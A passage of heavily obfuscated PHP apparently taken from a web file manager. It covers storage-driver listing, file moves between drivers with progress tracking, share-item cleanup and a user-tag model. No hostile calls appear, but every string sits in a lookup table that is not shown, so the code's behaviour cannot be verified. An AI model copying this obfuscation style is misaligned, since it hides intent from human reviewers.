$dÈ‡­‹ø”¦ = isset($DÎÎ¸÷É[$dö–°©²ÜØ]) ? $DÎÎ¸÷É[$dö–°©²ÜØ] : ucfirst($dö–°©²ÜØ); $Eºæ»®Ë†¤ = $Fõ·ğ˜¹Œ‹[71] . $dÈ‡­‹ø”¦; if (!$dÈ‡­‹ø”¦ || !class_exists($Eºæ»®Ë†¤)) { write_log(array($Fõ·ğ˜¹Œ‹[2405], $C×Ñ‹ùÔóÎ, get_caller_info()), $Fõ·ğ˜¹Œ‹[2406]); show_json(LNG($Fõ·ğ˜¹Œ‹[2407]), !1, $C×Ñ‹ùÔóÎ); } goto D”„Óì¡è; cÅëø…©­ò: $Fõ·ğ˜¹Œ‹ =& $_SERVER[‡’¶øåüç˜]; $dö–°©²ÜØ = strtolower($C×Ñ‹ùÔóÎ[$Fõ·ğ˜¹Œ‹[90]]); $fæÓòÈÍáØ = json_decode($C×Ñ‹ùÔóÎ[$Fõ·ğ˜¹Œ‹[6]], !0); goto EÕÙŠŠ‚; D”„Óì¡è: $cáˆ˜ìªÑ— = new $Eºæ»®Ë†¤($fæÓòÈÍáØ); if (in_array($dö–°©²ÜØ, $cáˆ˜ìªÑ—->objectDriver)) { if (!$cáˆ˜ìªÑ—->isBucketCors() && !$cáˆ˜ìªÑ—->setBucketCors()) { $a´‡ÍøÑìš = LNG($Fõ·ğ˜¹Œ‹[2408]); $a´‡ÍøÑìš .= $Fõ·ğ˜¹Œ‹[2409] . LNG($Fõ·ğ˜¹Œ‹[2410]); show_json($a´‡ÍøÑìš, !1); } } $Dœ©«è¡¬ = rtrim($fæÓòÈÍáØ[$Fõ·ğ˜¹Œ‹[1032]], $Fõ·ğ˜¹Œ‹[8]) . $Fõ·ğ˜¹Œ‹[8]; goto báÙ…øêÀ; báÙ…øêÀ: $aŞ‘ßÆ™†æ = $cáˆ˜ìªÑ—->getPath($Dœ©«è¡¬ . $Fõ·ğ˜¹Œ‹[1993]); if (!$cáˆ˜ìªÑ—->mkfile($aŞ‘ßÆ™†æ)) { show_json(LNG($Fõ·ğ˜¹Œ‹[2408]), !1); } $fæÓòÈÍáØ[$Fõ·ğ˜¹Œ‹[1032]] = $Dœ©«è¡¬; goto BÜíÁî°Í; bœ²èà¸¿¿: } public function driverListSystem() { $dö®ç«°Šã =& $_SERVER[‡’¶øåüç˜]; $cÉ¤‰øÖ®ä = parent::listData(); $fàÎĞ¼ë™¢ = array(); foreach ($cÉ¤‰øÖ®ä as $Dæ¿ãÌ¯›) { unset($Dæ¿ãÌ¯›[$dö®ç«°Šã[191]], $Dæ¿ãÌ¯›[$dö®ç«°Šã[107]]); $Dæ¿ãÌ¯›[$dö®ç«°Šã[6]] = json_decode($Dæ¿ãÌ¯›[$dö®ç«°Šã[6]], !0); $fàÎĞ¼ë™¢[] = $Dæ¿ãÌ¯›; } return $fàÎĞ¼ë™¢; } public function defaultDriver() { $Dìé¿›·é =& $_SERVER[‡’¶øåüç˜]; $eÕÊÎŞÄªä = parent::listData(); $eåò²ºòÈ‰ = array_filter_by_field($eÕÊÎŞÄªä, $Dìé¿›·é[34], 1); $eåò²ºòÈ‰ = $eåò²ºòÈ‰[0]; if ($eåò²ºòÈ‰) { $eåò²ºòÈ‰[$Dìé¿›·é[6]] = json_decode($eåò²ºòÈ‰[$Dìé¿›·é[6]], !0); } return $eåò²ºòÈ‰; } public function driverInfo($C×âŠ¥¬àŠ) { $eëÍ†ò âù =& $_SERVER[‡’¶øåüç˜]; $d¿‡öøƒ¨Ê = array_to_keyvalue(parent::listData(), $eëÍ†ò âù[371]); if (!isset($d¿‡öøƒ¨Ê[$C×âŠ¥¬àŠ])) { return !1; } $CƒÛ‡Ó…Æ = $d¿‡öøƒ¨Ê[$C×âŠ¥¬àŠ]; $CƒÛ‡Ó…Æ[$eëÍ†ò âù[6]] = json_decode($CƒÛ‡Ó…Æ[$eëÍ†ò âù[6]], !0); return $CƒÛ‡Ó…Æ; } public function remove($aÄï¸—ÍØÏ) { $this->removeShareItems($aÄï¸—ÍØÏ); return parent::remove($aÄï¸—ÍØÏ); } public function removeWithFile($E»„­É½Ø, $b®¶»˜à) { goto DÏ·ßº§ä; f”·È¡í·Â: if (!$B‰‹À£šàŠ) { $AÖ…§ßƒœ¿->stop($eÔó„±ºˆ); return !1; } $AÖ…§ßƒœ¿->end(); if ($b®¶»˜à == $B³ó¢é‰†Á[2078]) { $this->remove($E»„­É½Ø); } goto CÅİâ¦ªÊ‹; e§ê„¯Şù: $B··¾‹ò¤ = "\173\151\x6f\x3a{$dß¾Á’™ë²}\x7d\x2f"; $B‰‹À£šàŠ = !0; $DÖÃ¡ê¨‚ = array(); goto A…¤­¯Œœ; cÆ±³ØÅ: $F–½Óƒ°½„ = Model($B³ó¢é‰†Á[434])->where($cŒëñõìËÙ)->sum($B³ó¢é‰†Á[77]); $eÔó„±ºˆ = $b®¶»˜à . $B³ó¢é‰†Á[2411] . $E»„­É½Ø; $AÖ…§ßƒœ¿ = new TaskFileTransfer($eÔó„±ºˆ, $B³ó¢é‰†Á[2406], $FÄºâŞ™‚‘, LNG($B³ó¢é‰†Á[2412]) . "\50{$E»„­É½Ø}\51"); goto Aè¸ ¢†‰¥; DÏ·ßº§ä: $B³ó¢é‰†Á =& $_SERVER[‡’¶øåüç˜]; $cŒëñõìËÙ = array($B³ó¢é‰†Á[749] => $E»„­É½Ø); $FÄºâŞ™‚‘ = Model($B³ó¢é‰†Á[434])->where($cŒëñõìËÙ)->count(); goto cÆ±³ØÅ; A…¤­¯Œœ: $f¥­÷ò©º¿ = Model($B³ó¢é‰†Á[171])->where($cŒëñõìËÙ)->field($B³ó¢é‰†Á[2413])->select(); foreach ($f¥­÷ò©º¿ as $Dªç®´í) { goto BÎ«Ù“„Æ; f´¿êÜÜ: if (IO::exist($e×ôÀÄñ·”)) { $AÖ…§ßƒœ¿->updateFileEnd($Dªç®´í[$B³ó¢é‰†Á[28]], $Dªç®´í[$B³ó¢é‰†Á[77]]); continue; } if (!IO::move($c¡ˆå‡ô»‡, get_path_father($e×ôÀÄñ·”))) { $B‰‹À£šàŠ = !1; break; } $cŒëñõìËÙ = array($B³ó¢é‰†Á[431] => $Dªç®´í[$B³ó¢é‰†Á[431]]); goto A¸ä³»Æß‰; A¸ä³»Æß‰: $bâ×ŞŞƒç¼ = array($B³ó¢é‰†Á[749] => $dß¾Á’™ë², $B³ó¢é‰†Á[75] => $e×ôÀÄñ·”); Model($B³ó¢é‰†Á[171])->where($cŒëñõìËÙ)->save($bâ×ŞŞƒç¼); goto B™ĞÄ©¥œ—; BÎ«Ù“„Æ: $c¡ˆå‡ô»‡ = $Dªç®´í[$B³ó¢é‰†Á[75]]; $e×ôÀÄñ·” = $B··¾‹ò¤ . str_replace("\173\x69\x6f\x3a{$E»„­É½Ø}\175\57", $B³ó¢é‰†Á[33], $c¡ˆå‡ô»‡); if (!IO::exist($c¡ˆå‡ô»‡)) { $DÖÃ¡ê¨‚[] = $Dªç®´í[$B³ó¢é‰†Á[431]]; $AÖ…§ßƒœ¿->updateFileEnd($Dªç®´í[$B³ó¢é‰†Á[28]], $Dªç®´í[$B³ó¢é‰†Á[77]]); continue; } goto f´¿êÜÜ; B™ĞÄ©¥œ—: } $this->removeByFileID($DÖÃ¡ê¨‚); goto f”·È¡í·Â; Aè¸ ¢†‰¥: $AÖ…§ßƒœ¿->task[$B³ó¢é‰†Á[704]] = (double) $F–½Óƒ°½„; $eª¸êùñ‘à = KodIO::defaultDriver(); $dß¾Á’™ë² = $eª¸êùñ‘à[$B³ó¢é‰†Á[371]]; goto e§ê„¯Şù; CÅİâ¦ªÊ‹: } public function progress($E­‹É¡Šì, $E‚ÏÌè˜¨å) { return Task::get($E‚ÏÌè˜¨å . $_SERVER[‡’¶øåüç˜][2411] . $E­‹É¡Šì); } private function removeByFileID($eŸÜßùÔÎù = array()) { goto C´Çë²‚¾…; C´Çë²‚¾…: $B¥ñİ„…˜á =& $_SERVER[‡’¶øåüç˜]; if (empty($eŸÜßùÔÎù)) { return; } $D²å…›•Ö = array($B¥ñİ„…˜á[431] => array($B¥ñİ„…˜á[7], $eŸÜßùÔÎù)); goto DÛô‚ÜŞĞ; DÛô‚ÜŞĞ: $a›†òÅ—™š = Model($B¥ñİ„…˜á[1124])->where($D²å…›•Ö)->field($B¥ñİ„…˜á[381])->select(); if (!$a›†òÅ—™š) { return; } $a›†òÅ—™š = array_to_keyvalue($a›†òÅ—™š, $B¥ñİ„…˜á[33], $B¥ñİ„…˜á[381]); goto eÃ¢×¬Ùô; eÃ¢×¬Ùô: foreach ($a›†òÅ—™š as $Cê•£Ñ¼®‰) { Model($B¥ñİ„…˜á[394])->removeNow($Cê•£Ñ¼®‰, !1); } goto féˆ…„‡¶Û; féˆ…„‡¶Û: } private function removeShareItems($C’ğ“Ç‡›Á) { goto b™¡°ƒµ¹; aÉÈˆè¯°â: Model($E˜âÒ‘“†[548])->remove($eçÄÈ¦Á’ù); goto F†§Ñ‰Œ‘ˆ; b™¡°ƒµ¹: $E˜âÒ‘“† =& $_SERVER[‡’¶øåüç˜]; $C‡×‚÷Ÿšô = "\x7b\151\157\x3a{$C’ğ“Ç‡›Á}\175\x2f"; $D¼”„êƒ¨¸ = array($E˜âÒ‘“†[381] => 0, $E˜âÒ‘“†[1027] => array($E˜âÒ‘“†[757], "{$C‡×‚÷Ÿšô}\45")); goto Cœ¶Ë‚Å¦¯; Cœ¶Ë‚Å¦¯: $a¸¡Úµğ’ = Model($E˜âÒ‘“†[2089])->where($D¼”„êƒ¨¸)->field($E˜âÒ‘“†[452])->select(); if (empty($a¸¡Úµğ’)) { return; } $eçÄÈ¦Á’ù = array_to_keyvalue($a¸¡Úµğ’, $E˜âÒ‘“†[33], $E˜âÒ‘“†[452]); goto aÉÈˆè¯°â; F†§Ñ‰Œ‘ˆ: } } goto A¨Š¸¡ÍŠ×; Fñ¦ „á‡ä: define($_SERVER[‡’¶øåüç˜][557], $_SERVER[‡’¶øåüç˜][558]); $CÍØÉ²›”³ = $_SERVER[‡’¶øåüç˜][559]; while ($CÍØÉ²›”³ < $_SERVER[‡’¶øåüç˜][377]) { if ($CÍØÉ²›”³ >= 0) { break; } $CÍØÉ²›”³++; } goto CëÊîØ‘¬Ä; b¾œ¡ø¿®: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($a¢ƒ“¦÷Õ) { $b¨ÆùËÕ¸‰ =& $_SERVER[‡’¶øåüç˜]; return array($b¨ÆùËÕ¸‰[2208] => array(USER_ID, $b¨ÆùËÕ¸‰[2209])); } protected function listData() { $F»ƒ‡Ëˆìö =& $_SERVER[‡’¶øåüç˜]; $aàÍÍÂˆ®Û = array($F»ƒ‡Ëˆìö[1434] => USER_ID, $F»ƒ‡Ëˆìö[447] => array($F»ƒ‡Ëˆìö[2212], 0)); $Eã³ÕÒª = $F»ƒ‡Ëˆìö[2214]; $DİÒˆ±—äê = $this->field($Eã³ÕÒª)->where($aàÍÍÂˆ®Û)->order($F»ƒ‡Ëˆìö[2215])->select(); return $DİÒˆ±—äê ? $DİÒˆ±—äê : array(); } protected function listByTag($Aë®Ì©äŞ) { } protected function addToTag($fÒôàöè¬ä, $C´ó‘ÆÎÖµ) { $cê„ ‚‡× =& $_SERVER[‡’¶øåüç˜]; if (!Model($cê„ ‚‡×[2350])->listData($C´ó‘ÆÎÖµ) || !Model($cê„ ‚‡×[758])->pathInfo($fÒôàöè¬ä)) { return !1; } $eŠ…‡»ˆéÙ = array($cê„ ‚‡×[1434] => USER_ID, $cê„ ‚‡×[447] => $C´ó‘ÆÎÖµ, $cê„ ‚‡×[399] => $fÒôàöè¬ä, $cê„ ‚‡×[400] => $cê„ ‚‡×[394], $cê„ ‚‡×[398] => $cê„ ‚‡×[33], $cê„ ‚‡×[2116] => 0); if ($this->where($eŠ…‡»ˆéÙ)->find()) { return !1; } return $this->add($eŠ…‡»ˆéÙ); } protected function removeFromTag($CÖİ˜Ñ¬í, $fÃ«Óä‰Æ) { $Bºç«ˆÖ¦ =& $_SERVER[‡’¶øåüç˜]; if (!Model($Bºç«ˆÖ¦[2350])->listData($fÃ«Óä‰Æ)) { return !1; } if (is_array($CÖİ˜Ñ¬í)) { $CÖİ˜Ñ¬í = array($Bºç«ˆÖ¦[7], $CÖİ˜Ñ¬í); } $E¶¯œêÌÎ× = array($Bºç«ˆÖ¦[1434] => USER_ID, $Bºç«ˆÖ¦[447] => $fÃ«Óä‰Æ, $Bºç«ˆÖ¦[400] => $Bºç«ˆÖ¦[394], $Bºç«ˆÖ¦[399] => $CÖİ˜Ñ¬í); return $this->where($E¶¯œêÌÎ×)->delete(); } protected function removeByTag($f¶Ø›Ãß¤) { $eß›Ê©†É =& $_SERVER[‡’¶øåüç˜]; if (!$f¶Ø›Ãß¤) { return !1; } $e‘Œ²Œí„ = array($eß›Ê©†É[1434] => USER_ID, $eß›Ê©†É[447] => $f¶Ø›Ãß¤); return $this->where($e‘Œ²Œí„)->delete(); } protected function removeBySource($AÃÒÎÔ…±) { $aºĞ©¹»Ò =& $_SERVER[‡’¶øåüç˜]; if (is_array($AÃÒÎÔ…±)) { $AÃÒÎÔ…± = array($aºĞ©¹»Ò[7], $AÃÒÎÔ…±); } $d¸ÁŒæ»ì‚ = array($aºĞ©¹»Ò[1434] => USER_ID, $aºĞ©¹»Ò[399] => $AÃÒÎÔ…±, $aºĞ©¹»Ò[447] => array($aºĞ©¹»Ò[931], 0)); return $this->where($d¸ÁŒæ»ì‚)->delete(); } }